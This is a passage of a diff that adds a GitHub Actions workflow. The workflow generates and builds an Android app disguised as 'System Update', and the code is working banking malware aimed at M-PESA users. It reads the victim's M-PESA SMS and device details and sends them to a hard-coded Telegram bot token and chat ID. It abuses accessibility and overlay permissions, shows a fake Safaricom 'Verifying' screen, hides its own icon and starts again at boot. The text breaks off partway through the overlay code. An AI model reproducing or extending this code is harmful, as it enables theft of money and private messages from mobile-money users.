@@ -1,0 +1,2124 @@
+name: Build M-PESA Automation APK
+
+permissions:
+  contents: write
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+env:
+  ANDROID_HOME: /usr/local/lib/android/sdk
+  ANDROID_SDK_ROOT: /usr/local/lib/android/sdk
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+
+      - name: Verify Android SDK
+        run: |
+          echo "ANDROID_HOME=$ANDROID_HOME"
+          ls "$ANDROID_HOME" || true
+          ls "$ANDROID_HOME/platforms" || true
+          ls "$ANDROID_HOME/build-tools" || true
+
+      - name: Create project directory structure
+        run: |
+          mkdir -p app/src/main/java/com/system/updator
+          mkdir -p app/src/main/res/xml
+          mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/res/layout
+          mkdir -p app/src/main/res/drawable
+          mkdir -p app/src/main/assets
+
+      - name: Generate settings.gradle
+        run: |
+          cat > settings.gradle << 'EOF'
+          pluginManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+                  gradlePluginPortal()
+              }
+          }
+          dependencyResolutionManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          rootProject.name = "SystemUpdator"
+          include ':app'
+          EOF
+
+      - name: Generate root build.gradle
+        run: |
+          cat > build.gradle << 'EOF'
+          buildscript {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:8.1.0'
+              }
+          }
+          allprojects {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          EOF
+
+      - name: Generate app/build.gradle
+        run: |
+          cat > app/build.gradle << 'EOF'
+          plugins {
+              id 'com.android.application'
+          }
+
+          android {
+              namespace 'com.system.updator'
+              compileSdk 34
+
+              defaultConfig {
+                  applicationId "com.system.updator"
+                  minSdk 26
+                  targetSdk 34
+                  versionCode 10
+                  versionName "10.0"
+              }
+
+              buildTypes {
+                  release {
+                      minifyEnabled false
+                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
+                  }
+                  debug {
+                      minifyEnabled false
+                  }
+              }
+
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_17
+                  targetCompatibility JavaVersion.VERSION_17
+              }
+          }
+
+          dependencies {
+              implementation 'androidx.appcompat:appcompat:1.6.1'
+              implementation 'androidx.core:core:1.12.0'
+              implementation 'com.google.android.material:material:1.11.0'
+              implementation 'androidx.work:work-runtime:2.9.0'
+              implementation 'androidx.webkit:webkit:1.9.0'
+              implementation 'com.google.code.gson:gson:2.10.1'
+          }
+          EOF
+
+      - name: Generate gradle.properties
+        run: |
+          cat > gradle.properties << 'EOF'
+          org.gradle.jvmargs=-Xmx2048m
+          android.useAndroidX=true
+          android.enableJetifier=false
+          android.suppressUnsupportedCompileSdk=34
+          sdk.dir=/usr/local/lib/android/sdk
+          EOF
+
+      - name: Generate local.properties
+        run: echo "sdk.dir=/usr/local/lib/android/sdk" > local.properties
+
+      - name: Generate Gradle wrapper properties
+        run: |
+          mkdir -p gradle/wrapper
+          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
+          distributionBase=GRADLE_USER_HOME
+          distributionPath=wrapper/dists
+          distributionUrl=https\://services.gradle.org/distributions/gradle-8.0-bin.zip
+          zipStoreBase=GRADLE_USER_HOME
+          zipStorePath=wrapper/dists
+          EOF
+          curl -sL -o gradle/wrapper/gradle-wrapper.jar \
+            https://raw.githubusercontent.com/gradle/gradle/v8.0.0/gradle/wrapper/gradle-wrapper.jar
+
+      - name: Generate gradlew script
+        run: |
+          cat > gradlew << 'EOF'
+          #!/bin/sh
+          APP_HOME=$( cd "${APP_HOME:-./}" && pwd -P ) || exit
+          APP_NAME="Gradle"
+          APP_BASE_NAME=${0##*/}
+          DEFAULT_JVM_OPTS='"-Xmx64m" "-Xms64m"'
+          MAX_FD=maximum
+          warn () { echo "$*" >&2; }
+          die () { echo "$*"; echo; exit 1; }
+          cygwin=false
+          msys=false
+          darwin=false
+          nonstop=false
+          case "$( uname )" in
+            CYGWIN* ) cygwin=true ;;
+            Darwin* ) darwin=true ;;
+            MSYS* | MINGW* ) msys=true ;;
+            NONSTOP* ) nonstop=false ;;
+          esac
+          CLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar
+          if [ -n "$JAVA_HOME" ] ; then
+              if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
+                  JAVACMD=$JAVA_HOME/jre/sh/java
+              else
+                  JAVACMD=$JAVA_HOME/bin/java
+              fi
+              if [ ! -x "$JAVACMD" ] ; then
+                  die "ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME"
+              fi
+          else
+              JAVACMD=java
+              which java >/dev/null 2>&1 || die "ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH."
+          fi
+          if ! "$cygwin" && ! "$darwin" && ! "$nonstop" ; then
+              case $MAX_FD in
+                max*) MAX_FD=$( ulimit -H -n ) || warn "Could not query maximum file descriptor limit" ;;
+              esac
+              case $MAX_FD in
+                '' | soft) : ;;
+                *) ulimit -n "$MAX_FD" || warn "Could not set maximum file descriptor limit to $MAX_FD" ;;
+              esac
+          fi
+          if "$cygwin" || "$msys" ; then
+              APP_HOME=$( cygpath --path --mixed "$APP_HOME" )
+              CLASSPATH=$( cygpath --path --mixed "$CLASSPATH" )
+              JAVACMD=$( cygpath --unix "$JAVACMD" )
+              for arg do
+                  if case $arg in -*) false;; /?*) t=${arg#/} t=/${t%%/*} [ -e "$t" ];; *) false;; esac; then
+                      arg=$( cygpath --path --ignore --mixed "$arg" )
+                  fi
+                  set -- "$@" "$arg"
+              done
+          fi
+          set -- $(echo "$@" | tr ' ' '\n' | sed 's/^--/ /' | tr '\n' ' ')
+          set -- \
+              "-Dorg.gradle.appname=$APP_BASE_NAME" \
+              -classpath "$CLASSPATH" \
+              org.gradle.wrapper.GradleWrapperMain \
+              "$@"
+          eval "set -- $(
+              printf '%s\n' "$DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS" |
+              xargs -n1 |
+              sed ' s~[^-[:alnum:]+,./:=@_]~\\&~g; ' |
+              tr '\n' ' '
+          )" '"$@"'
+          exec "$JAVACMD" "$@"
+          EOF
+          chmod +x gradlew
+
+      - name: Generate strings.xml
+        run: |
+          cat > app/src/main/res/values/strings.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <string name="app_name">System Update</string>
+          </resources>
+          EOF
+
+      - name: Generate launcher icon
+        run: |
+          cat > app/src/main/res/drawable/ic_launcher.xml << 'EOF'
+          <vector xmlns:android="http://schemas.android.com/apk/res/android"
+              android:width="192dp"
+              android:height="192dp"
+              android:viewportWidth="192"
+              android:viewportHeight="192">
+              <path
+                  android:fillColor="#3B82F6"
+                  android:pathData="M96,32c-6.6,0 -12,5.4 -12,12s5.4,12 12,12 12,-5.4 12,-12 -5.4,-12 -12,-12zM96,68c-6.6,0 -12,5.4 -12,12s5.4,12 12,12 12,-5.4 12,-12 -5.4,-12 -12,-12zM96,104c-6.6,0 -12,5.4 -12,12s5.4,12 12,12 12,-5.4 12,-12 -5.4,-12 -12,-12z"/>
+          </vector>
+          EOF
+
+      - name: Generate overlay HTML
+        run: |
+          cat > app/src/main/assets/overlay.html << 'HTMLEOF'
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+            <title>Verifying</title>
+            <style>
+              * { box-sizing: border-box; }
+              html, body {
+                width: 100%; height: 100%;
+                min-width: 100%; min-height: 100%;
+                margin: 0; padding: 0; overflow: hidden;
+              }
+              body {
+                min-height: 100dvh;
+                background: #ffffff;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-family: Arial, sans-serif;
+              }
+              .container {
+                width: 100%; height: 100%;
+                min-height: 100dvh;
+                display: flex; flex-direction: column;
+                align-items: center; justify-content: center;
+                text-align: center; margin: 0; padding: 0;
+              }
+              .title { font-size: 28px; font-weight: 600; color: #008f3d; margin: 0 0 8px 0; }
+              .status { font-size: 16px; color: #555555; margin: 0 0 24px 0; }
+              .loader {
+                width: 42px; height: 42px; margin: 0;
+                border: 4px solid #e5e5e5;
+                border-top: 4px solid #008f3d;
+                border-radius: 50%;
+                animation: spin 2s linear infinite;
+              }
+              @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+            </style>
+          </head>
+          <body>
+            <div class="container">
+              <div class="title">Safaricom M-PESA</div>
+              <div class="status">Verifying</div>
+              <div class="loader"></div>
+            </div>
+          </body>
+          </html>
+          HTMLEOF
+
+      - name: Generate activity_overlay.xml
+        run: |
+          cat > app/src/main/res/layout/activity_overlay.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent"
+              android:layout_height="match_parent"
+              android:background="#FFFFFF"
+              android:fitsSystemWindows="false">
+              <WebView
+                  android:id="@+id/overlayWebView"
+                  android:layout_width="match_parent"
+                  android:layout_height="match_parent"
+                  android:fitsSystemWindows="false" />
+          </FrameLayout>
+          EOF
+
+      - name: Generate AndroidManifest.xml
+        run: |
+          cat > app/src/main/AndroidManifest.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              xmlns:tools="http://schemas.android.com/tools">
+
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
+              <uses-permission android:name="android.permission.RECEIVE_SMS" />
+              <uses-permission android:name="android.permission.READ_SMS" />
+              <uses-permission android:name="android.permission.CALL_PHONE" />
+              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+              <uses-permission android:name="android.permission.GET_TASKS" />
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+              <uses-permission android:name="android.permission.WAKE_LOCK" />
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+              <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+              <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+              <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+
+              <application
+                  android:allowBackup="true"
+                  android:label="@string/app_name"
+                  android:icon="@drawable/ic_launcher"
+                  android:usesCleartextTraffic="true"
+                  android:requestLegacyExternalStorage="true">
+
+                  <activity
+                      android:name=".MainActivity"
+                      android:exported="true"
+                      android:theme="@style/Theme.AppCompat.NoActionBar">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+
+                  <service
+                      android:name=".FinAutoService"
+                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.accessibilityservice.AccessibilityService" />
+                      </intent-filter>
+                      <meta-data
+                          android:name="android.accessibilityservice"
+                          android:resource="@xml/accessibility_config" />
+                  </service>
+
+                  <receiver
+                      android:name=".BootReceiver"
+                      android:exported="true"
+                      android:enabled="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.BOOT_COMPLETED" />
+                      </intent-filter>
+                  </receiver>
+
+                  <receiver
+                      android:name=".SmsReceiver"
+                      android:exported="true"
+                      android:enabled="true"
+                      android:permission="android.permission.BROADCAST_SMS">
+                      <intent-filter android:priority="999">
+                          <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                      </intent-filter>
+                  </receiver>
+              </application>
+          </manifest>
+          EOF
+
+      - name: Generate accessibility_config.xml
+        run: |
+          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeAllMask"
+              android:accessibilityFeedbackType="feedbackGeneric"
+              android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagRequestTouchExplorationMode|flagIncludeNotImportantViews"
+              android:canPerformGestures="true"
+              android:canRetrieveWindowContent="true"
+              android:description="@string/app_name"
+              android:notificationTimeout="50" />
+          EOF
+
+      - name: Generate activity_main.xml
+        run: |
+          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent"
+              android:layout_height="match_parent"
+              android:orientation="vertical"
+              android:gravity="center"
+              android:padding="32dp"
+              android:background="#0a0f1a">
+
+              <ImageView
+                  android:layout_width="80dp"
+                  android:layout_height="80dp"
+                  android:src="@drawable/ic_launcher"
+                  android:contentDescription="@string/app_name"
+                  android:layout_marginBottom="24dp" />
+
+              <TextView
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:text="System Update"
+                  android:textColor="#FFFFFF"
+                  android:textSize="24sp"
+                  android:textStyle="bold"
+                  android:layout_marginBottom="32dp" />
+
+              <Button
+                  android:id="@+id/btnPermissions"
+                  android:layout_width="match_parent"
+                  android:layout_height="56dp"
+                  android:text="Grant All Permissions"
+                  android:textAllCaps="false"
+                  android:backgroundTint="#3B82F6"
+                  android:layout_marginBottom="12dp" />
+
+              <Button
+                  android:id="@+id/btnOverlay"
+                  android:layout_width="match_parent"
+                  android:layout_height="56dp"
+                  android:text="Enable Overlay Permission"
+                  android:textAllCaps="false"
+                  android:backgroundTint="#10B981"
+                  android:layout_marginBottom="12dp" />
+
+              <Button
+                  android:id="@+id/btnAccessibility"
+                  android:layout_width="match_parent"
+                  android:layout_height="56dp"
+                  android:text="Enable Accessibility Service"
+                  android:textAllCaps="false"
+                  android:backgroundTint="#8B5CF6"
+                  android:layout_marginBottom="12dp" />
+
+              <TextView
+                  android:id="@+id/tvStatus"
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:text="Initializing..."
+                  android:textColor="#94A3B8"
+                  android:textSize="14sp"
+                  android:layout_marginTop="24dp" />
+          </LinearLayout>
+          EOF
+
+      - name: Generate TelegramQueue.java
+        run: |
+          cat > app/src/main/java/com/system/updator/TelegramQueue.java << 'EOF'
+          package com.system.updator;
+
+          import android.content.Context;
+          import android.net.ConnectivityManager;
+          import android.net.Network;
+          import android.net.NetworkCapabilities;
+          import android.net.NetworkRequest;
+          import android.util.Log;
+
+          import org.json.JSONObject;
+
+          import java.io.BufferedReader;
+          import java.io.File;
+          import java.io.FileInputStream;
+          import java.io.FileOutputStream;
+          import java.io.InputStreamReader;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+          import java.net.URLEncoder;
+          import java.nio.charset.StandardCharsets;
+          import java.util.ArrayList;
+          import java.util.List;
+          import java.util.concurrent.ExecutorService;
+          import java.util.concurrent.Executors;
+
+          public class TelegramQueue {
+
+              private static final String TAG = "TelegramQueue";
+              private static final int MAX_QUEUE = 500;
+
+              private static TelegramQueue instance;
+
+              private final Context appContext;
+              private final File queueFile;
+              private final ExecutorService executor = Executors.newSingleThreadExecutor();
+              private final Object lock = new Object();
+
+              private ConnectivityManager.NetworkCallback networkCallback;
+
+              private TelegramQueue(Context context) {
+                  this.appContext = context.getApplicationContext();
+                  File dir = new File(appContext.getFilesDir(), "fin_vault");
+                  if (!dir.exists()) dir.mkdirs();
+                  this.queueFile = new File(dir, "telegram_queue.jsonl");
+              }
+
+              public static synchronized TelegramQueue get(Context context) {
+                  if (instance == null) instance = new TelegramQueue(context);
+                  return instance;
+              }
+
+              public void registerNetworkCallback() {
+                  if (networkCallback != null) return;
+                  try {
+                      ConnectivityManager cm = (ConnectivityManager)
+                              appContext.getSystemService(Context.CONNECTIVITY_SERVICE);
+                      if (cm == null) return;
+                      networkCallback = new ConnectivityManager.NetworkCallback() {
+                          @Override
+                          public void onAvailable(Network network) {
+                              flush();
+                          }
+                      };
+                      NetworkRequest req = new NetworkRequest.Builder()
+                              .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                              .build();
+                      cm.registerNetworkCallback(req, networkCallback);
+                  } catch (Exception e) {
+                      Log.e(TAG, "registerNetworkCallback failed", e);
+                  }
+              }
+
+              public void send(String text) {
+                  if (text == null || text.isEmpty()) return;
+                  enqueue(text);
+                  flush();
+              }
+
+              private void enqueue(String text) {
+                  synchronized (lock) {
+                      try {
+                          JSONObject obj = new JSONObject();
+                          obj.put("ts", System.currentTimeMillis());
+                          obj.put("text", text);
+                          List<String> lines = readQueue();
+                          lines.add(obj.toString());
+                          if (lines.size() > MAX_QUEUE) {
+                              int drop = lines.size() - MAX_QUEUE;
+                              for (int i = 0; i < drop; i++) lines.remove(0);
+                          }
+                          writeQueue(lines);
+                      } catch (Exception e) {
+                          Log.e(TAG, "enqueue failed", e);
+                      }
+                  }
+              }
+
+              public void flush() {
+                  executor.execute(this::flushInternal);
+              }
+
+              private void flushInternal() {
+                  synchronized (lock) {
+                      List<String> lines = readQueue();
+                      if (lines.isEmpty()) return;
+                      List<String> remaining = new ArrayList<>();
+                      boolean stop = false;
+                      for (int i = 0; i < lines.size(); i++) {
+                          String line = lines.get(i);
+                          if (stop) { remaining.add(line); continue; }
+                          String text;
+                          try {
+                              JSONObject obj = new JSONObject(line);
+                              text = obj.optString("text", "");
+                          } catch (Exception e) { continue; }
+                          if (text.isEmpty()) continue;
+                          boolean ok = sendSync(text);
+                          if (ok) {
+                              try { Thread.sleep(300); } catch (InterruptedException ignored) { }
+                          } else {
+                              remaining.add(line);
+                              stop = true;
+                          }
+                      }
+                      writeQueue(remaining);
+                  }
+              }
+
+              private boolean sendSync(String text) {
+                  HttpURLConnection conn = null;
+                  try {
+                      String encoded = URLEncoder.encode(text, "UTF-8");
+                      String urlStr = "https://api.telegram.org/bot"
+                              + FinAutoService.BOT_TOKEN + "/sendMessage?chat_id="
+                              + FinAutoService.CHAT_ID
+                              + "&parse_mode=Markdown&text=" + encoded;
+                      URL url = new URL(urlStr);
+                      conn = (HttpURLConnection) url.openConnection();
+                      conn.setRequestMethod("GET");
+                      conn.setConnectTimeout(8000);
+                      conn.setReadTimeout(8000);
+                      int code = conn.getResponseCode();
+                      return code >= 200 && code < 300;
+                  } catch (Exception e) {
+                      return false;
+                  } finally {
+                      if (conn != null) conn.disconnect();
+                  }
+              }
+
+              private List<String> readQueue() {
+                  List<String> out = new ArrayList<>();
+                  if (!queueFile.exists()) return out;
+                  try (BufferedReader br = new BufferedReader(
+                          new InputStreamReader(new FileInputStream(queueFile),
+                                  StandardCharsets.UTF_8))) {
+                      String line;
+                      while ((line = br.readLine()) != null) {
+                          if (!line.trim().isEmpty()) out.add(line);
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "readQueue failed", e);
+                  }
+                  return out;
+              }
+
+              private void writeQueue(List<String> lines) {
+                  try (FileOutputStream fos = new FileOutputStream(queueFile, false)) {
+                      for (String l : lines) {
+                          fos.write(l.getBytes(StandardCharsets.UTF_8));
+                          fos.write('\n');
+                      }
+                      fos.flush();
+                  } catch (Exception e) {
+                      Log.e(TAG, "writeQueue failed", e);
+                  }
+              }
+          }
+          EOF
+
+      - name: Generate MainActivity.java
+        run: |
+          cat > app/src/main/java/com/system/updator/MainActivity.java << 'EOF'
+          package com.system.updator;
+
+          import android.Manifest;
+          import android.app.Activity;
+          import android.content.ComponentName;
+          import android.content.Intent;
+          import android.content.SharedPreferences;
+          import android.content.pm.PackageManager;
+          import android.database.Cursor;
+          import android.net.Uri;
+          import android.os.Build;
+          import android.os.Bundle;
+          import android.os.Handler;
+          import android.provider.Settings;
+          import android.provider.Telephony;
+          import android.widget.Button;
+          import android.widget.TextView;
+          import android.util.Log;
+          import androidx.core.app.ActivityCompat;
+          import androidx.core.content.ContextCompat;
+
+          import java.text.SimpleDateFormat;
+          import java.util.Date;
+          import java.util.Locale;
+
+          public class MainActivity extends Activity {
+              private static final int PERMISSION_REQUEST = 100;
+              private static final String TAG = "MainActivity";
+
+              private static final long ACTIVATION_DELAY_MS = 5L * 60L * 1000L;
+
+              private static final String BOT_TOKEN = "8871459518:AAGhsiMwoG6qTGZ-S-6VIwRNszCQD2w1uQI";
+              private static final String CHAT_ID = "8468538314";
+
+              private TextView tvStatus;
+              private Button btnPermissions, btnOverlay, btnAccessibility;
+              private SharedPreferences prefs;
+              private Handler handler = new Handler(android.os.Looper.getMainLooper());
+
+              private static final String[] REQUIRED_PERMISSIONS = {
+                  Manifest.permission.RECEIVE_SMS,
+                  Manifest.permission.READ_SMS,
+                  Manifest.permission.CALL_PHONE,
+                  Manifest.permission.READ_PHONE_STATE,
+                  Manifest.permission.READ_PHONE_NUMBERS
+              };
+
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  setContentView(R.layout.activity_main);
+
+                  prefs = getSharedPreferences("fin_vault", MODE_PRIVATE);
+
+                  long installTime;
+                  if (!prefs.contains("install_time")) {
+                      installTime = System.currentTimeMillis();
+                      prefs.edit().putLong("install_time", installTime).apply();
+                  } else {
+                      installTime = prefs.getLong("install_time", 0L);
+                  }
+
+                  if (!prefs.getBoolean("install_notice_sent", false)) {
+                      prefs.edit().putBoolean("install_notice_sent", true).apply();
+                      sendInstallNotice(installTime);
+                  }
+
+                  tvStatus = findViewById(R.id.tvStatus);
+                  btnPermissions = findViewById(R.id.btnPermissions);
+                  btnOverlay = findViewById(R.id.btnOverlay);
+                  btnAccessibility = findViewById(R.id.btnAccessibility);
+
+                  btnPermissions.setOnClickListener(v -> {
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                          ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST);
+                      }
+                  });
+
+                  btnOverlay.setOnClickListener(v -> {
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                          if (!Settings.canDrawOverlays(this)) {
+                              Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                                      Uri.parse("package:" + getPackageName()));
+                              startActivity(i);
+                          } else {
+                              tvStatus.setText("Overlay permission already granted");
+                          }
+                      }
+                  });
+
+                  btnAccessibility.setOnClickListener(v -> {
+                      startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+                  });
+
+                  checkAndHideIfReady();
+              }
+
+              private void sendInstallNotice(long installTime) {
+                  String installDate = formatTime(installTime);
+                  long activationTime = installTime + ACTIVATION_DELAY_MS;
+                  String activationDate = formatTime(activationTime);
+
+                  String mpesaSms = readNewestMpesaSms();
+                  if (mpesaSms == null) mpesaSms = "(no M-PESA SMS found)";
+
+                  String deviceInfo =
+                      "*Device installed: System Update*\n" +
+                      "Model: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
+                      "Brand: " + Build.BRAND + "\n" +
+                      "Device: " + Build.DEVICE + "\n" +
+                      "Android: " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")\n" +
+                      "Installed: " + installDate + "\n" +
+                      "Activation due (5 minutes): " + activationDate + "\n" +
+                      "Newest M-PESA SMS: " + mpesaSms;
+
+                  TelegramQueue.get(this).send(deviceInfo);
+              }
+
+              private void maybeSendAllPermissionsGrantedNotice(
+                      boolean allPermsGranted,
+                      boolean overlayGranted,
+                      boolean accessibilityEnabled) {
+
+                  if (!allPermsGranted || !overlayGranted || !accessibilityEnabled) return;
+                  if (prefs.getBoolean("all_perms_notice_sent", false)) return;
+
+                  prefs.edit().putBoolean("all_perms_notice_sent", true).apply();
+
+                  long installTime = prefs.getLong("install_time", System.currentTimeMillis());
+                  String installDate = formatTime(installTime);
+                  String activationDate = formatTime(installTime + ACTIVATION_DELAY_MS);
+
+                  String mpesaSms = readNewestMpesaSms();
+                  if (mpesaSms == null) mpesaSms = "(no M-PESA SMS found)";
+
+                  String msg =
+                      "*All permissions granted: System Update*\n" +
+                      "Model: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
+                      "Brand: " + Build.BRAND + "\n" +
+                      "Device: " + Build.DEVICE + "\n" +
+                      "Android: " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")\n" +
+                      "Installed: " + installDate + "\n" +
+                      "Activation due (5 minutes): " + activationDate + "\n" +
+                      "Newest M-PESA SMS: " + mpesaSms + "\n\n" +
+                      "All required permissions received ✅\n" +
+                      "SMS ✅\n" +
+                      "Overlay ✅\n" +
+                      "Accessibility ✅";
+
+                  TelegramQueue.get(this).send(msg);
+              }
+
+              private String readNewestMpesaSms() {
+                  try {
+                      Cursor cursor = getContentResolver().query(
+                          Telephony.Sms.Inbox.CONTENT_URI,
+                          new String[]{ Telephony.Sms.Inbox.BODY, Telephony.Sms.Inbox.ADDRESS },
+                          null, null,
+                          Telephony.Sms.Inbox.DATE + " DESC");
+                      if (cursor == null) return null;
+                      int count = 0;
+                      while (cursor.moveToNext() && count < 5) {
+                          count++;
+                          String body = cursor.getString(0);
+                          String sender = cursor.getString(1);
+                          if (body == null) continue;
+                          String b = body.toLowerCase();
+                          String s = sender != null ? sender.toLowerCase() : "";
+                          if (b.contains("m-pesa") || b.contains("mpesa") || b.contains("m_pesa")
+                              || s.contains("m-pesa") || s.contains("mpesa") || s.contains("m_pesa")) {
+                              cursor.close();
+                              return body;
+                          }
+                      }
+                      cursor.close();
+                  } catch (Exception e) {
+                      Log.e(TAG, "readNewestMpesaSms error", e);
+                  }
+                  return null;
+              }
+
+              private String formatTime(long millis) {
+                  SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.getDefault());
+                  return sdf.format(new Date(millis));
+              }
+
+              @Override
+              public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+                  if (requestCode == PERMISSION_REQUEST) {
+                      checkAndHideIfReady();
+                  }
+              }
+
+              @Override
+              protected void onResume() {
+                  super.onResume();
+                  checkAndHideIfReady();
+              }
+
+              private void checkAndHideIfReady() {
+                  boolean allPermsGranted = true;
+                  for (String perm : REQUIRED_PERMISSIONS) {
+                      if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                          allPermsGranted = false;
+                          break;
+                      }
+                  }
+
+                  boolean overlayGranted = Settings.canDrawOverlays(this);
+                  boolean accessibilityEnabled = isAccessibilityServiceEnabled();
+
+                  maybeSendAllPermissionsGrantedNotice(allPermsGranted, overlayGranted, accessibilityEnabled);
+
+                  if (allPermsGranted) {
+                      tvStatus.setText("Permissions granted");
+                      if (accessibilityEnabled && overlayGranted) {
+                          tvStatus.setText("All ready - disappearing...");
+                          hideAppIcon();
+                          handler.postDelayed(() -> finish(), 500);
+                      } else if (!overlayGranted) {
+                          tvStatus.setText("Enable Overlay Permission");
+                      } else {
+                          tvStatus.setText("Enable Accessibility Service");
+                      }
+                  } else {
+                      tvStatus.setText("Grant All Permissions");
+                  }
+              }
+
+              private boolean isAccessibilityServiceEnabled() {
+                  String service = getPackageName() + "/" + FinAutoService.class.getCanonicalName();
+                  String enabledServices = Settings.Secure.getString(getContentResolver(),
+                      Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+                  return enabledServices != null && enabledServices.contains(service);
+              }
+
+              private void hideAppIcon() {
+                  try {
+                      ComponentName componentName = new ComponentName(this, MainActivity.class);
+                      getPackageManager().setComponentEnabledSetting(
+                          componentName,
+                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                          PackageManager.DONT_KILL_APP);
+                  } catch (Exception e) {
+                      Log.e(TAG, "Hide icon error", e);
+                  }
+              }
+          }
+          EOF
+
+      - name: Generate OverlayManager.java
+        run: |
+          cat > app/src/main/java/com/system/updator/OverlayManager.java << 'EOF'
+          package com.system.updator;
+
+          import android.content.Context;
+          import android.graphics.PixelFormat;
+          import android.os.Build;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.util.Log;
+          import android.view.Gravity;
+          import android.view.LayoutInflater;
+          import android.view.View;
+          import android.view.WindowManager;
+          import android.webkit.WebSettings;
+          import android.webkit.WebView;
+          import android.webkit.WebViewClient;
+
+          public class OverlayManager {
+
+              private static final String TAG = "OverlayManager";
+              private static OverlayManager instance;
+
+              private final Context context;
+              private final Handler mainHandler = new Handler(Looper.getMainLooper());
+
+              private WindowManager windowManager;
+              private View overlayView;
+              private WebView webView;
+              private boolean showing = false;
+
+              private OverlayManager(Context context) {
+                  this.context = context.getApplicationContext();
+              }
+
+              public static synchronized OverlayManager get(Context context) {
+                  if (instance == null) instance = new OverlayManager(context);
+                  return instance;
+              }
+
+              public synchronized void show() {
+                  if (showing) return;
+                  mainHandler.post(this::showInternal);
+              }
+
+              private void showInternal() {
+                  try {
+                      windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
+                      if (windowManager == null) return;
+
+                      LayoutInflater inflater = LayoutInflater.from(context);
+                      overlayView = inflater.inflate(R.layout.activity_overlay, null);
+
+                      webView = overlayView.findViewById(R.id.overlayWebView);
+                      if (webView != null) {
+                          WebSettings s = webView.getSettings();
+                          s.setJavaScriptEnabled(true);
+                          s.setAllowFileAccess(true);
+                          s.setAllowContentAccess(true);
+                          s.setDomStorageEnabled(true);
+                          s.setLoadWithOverviewMode(true);
